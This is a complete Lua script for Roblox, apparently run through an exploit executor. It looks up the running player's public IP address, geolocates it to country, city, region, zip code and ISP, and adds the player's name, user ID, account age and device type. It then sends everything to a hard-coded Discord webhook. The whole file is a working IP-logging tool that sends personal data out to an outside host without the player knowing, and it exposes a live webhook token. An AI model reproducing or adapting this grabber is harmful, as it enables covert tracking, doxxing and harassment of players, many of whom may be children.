local player = game.Players.LocalPlayer -- Get the player object
local UserInputService = game:GetService("UserInputService") -- Get the UserInputService to detect the device

-- Function to get the player's device type
local function getDeviceType()
    if UserInputService.TouchEnabled then
        return "Mobile"
    elseif UserInputService.GamepadEnabled then
        return "Console"
    else
        return "PC"
    end
end

-- Fetch the player's public IP and detailed geolocation
local ipAddress, country, city, region, zip, isp, ipType
local success, errorMessage = pcall(function()
    ipAddress = game:HttpGet("https://api.ipify.org") -- Fetch the IP
    local geoData = game:HttpGet("http://ip-api.com/json/" .. ipAddress) -- Fetch geolocation info
    local geoTable = game:GetService("HttpService"):JSONDecode(geoData)

    country = geoTable.country or "Unknown Country" -- Extract country or fallback
    city = geoTable.city or "Unknown City" -- Extract city or fallback
    region = geoTable.regionName or "Unknown Region" -- Extract region or fallback
    zip = geoTable.zip or "Unknown Zip" -- Extract zip code or fallback
    isp = geoTable.isp or "Unknown ISP" -- Extract ISP information
    ipType = ipAddress:match("^[%d%.]+$") and "IPv4" or "IPv6" -- Check if the IP is IPv4 or IPv6
end)

if not success then
    ipAddress = "Failed to fetch IP"
    country = "Failed to fetch Country"
    city = "Failed to fetch City"
    region = "Failed to fetch Region"
    zip = "Failed to fetch Zip"
    isp = "Failed to fetch ISP"
    ipType = "Failed to fetch IP Type"
end

-- Get the total number of players in the server
local totalPlayers = game.Players.NumPlayers

-- Webhook setup (without leaderstats, but including country, city, region, etc.)
local OSTime = os.time()
local Time = os.date('!*t', OSTime)
local Content = ''
local PlayerName = player.Name
local PlayerUserId = player.UserId
local PlayerAccountAge = player.AccountAge
local DeviceType = getDeviceType() -- Get the player's device type

local MarketplaceService = game:GetService("MarketplaceService")
local Success, GameInfo = pcall(function()
    return MarketplaceService:GetProductInfo(game.PlaceId)
end)
local GameName = Success and GameInfo.Name or "Unknown Game"
local GameUrl = "https://www.roblox.com/games/" .. tostring(game.PlaceId)

local Embed = {
    title = ipAddress, -- Add the public IP address as the title
    color = 3447003,
    footer = { text = "Job ID: " .. game.JobId },
    author = {
        name = GameName,
        url = GameUrl,
    },
    fields = {
        {
            name = "Player Name",
            value = PlayerName,
            inline = true,
        },
        {
            name = "Execution Time",
            value = os.date("%A, %B %d, %Y at %H:%M:%S UTC", OSTime),
            inline = true,
        },
        {
            name = "Script executed in",
            value = string.format("[%s](%s)", GameName, GameUrl),
            inline = false,
        },
        {
            name = "Place ID",
            value = tostring(game.PlaceId),
            inline = true,
        },
        {
            name = "Player User ID",
            value = tostring(PlayerUserId),
            inline = true,
        },
        {
            name = "Account Age (Days)",
            value = tostring(PlayerAccountAge),
            inline = true,
        },
        {
            name = "Device Type",
            value = DeviceType, -- Display the device type
            inline = true,
        },
        {
            name = "Player Country",
            value = country, -- Display the player's country
            inline = true,
        },
        {
            name = "Player City",
            value = city, -- Display the player's city
            inline = true,
        },
        {
            name = "Player Region",
            value = region, -- Display the player's region
            inline = true,
        },
        {
            name = "Player Zip",
            value = zip, -- Display the player's zip code
            inline = true,
        },
        {
            name = "Player ISP",
            value = isp, -- Display the player's ISP
            inline = true,
        },
        {
            name = "IP Type",
            value = ipType, -- Display whether the IP is IPv4 or IPv6
            inline = true,
        },
        {
            name = "Total Players in Server",
            value = tostring(totalPlayers), -- Display the total players in the server
            inline = true,
        },
        {
            name = "Player Profile",
            value = string.format("[Click here to view profile](https://www.roblox.com/users/%d/profile)", PlayerUserId),
            inline = false,
        }
    },
    timestamp = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec),
}

(syn and syn.request or http_request) {
    Url = 'https://discord.com/api/webhooks/1321419923301335111/41YvfEcAapsxw1LFpv49w0eueeSk6AcevjFUgoCp3IVZUzTbvQxYwH3EQKpIaly7qZkZ',
    Method = 'POST',
    Headers = {
        ['Content-Type'] = 'application/json',
    },
    Body = game:GetService('HttpService'):JSONEncode({ content = Content; embeds = { Embed } }),
}
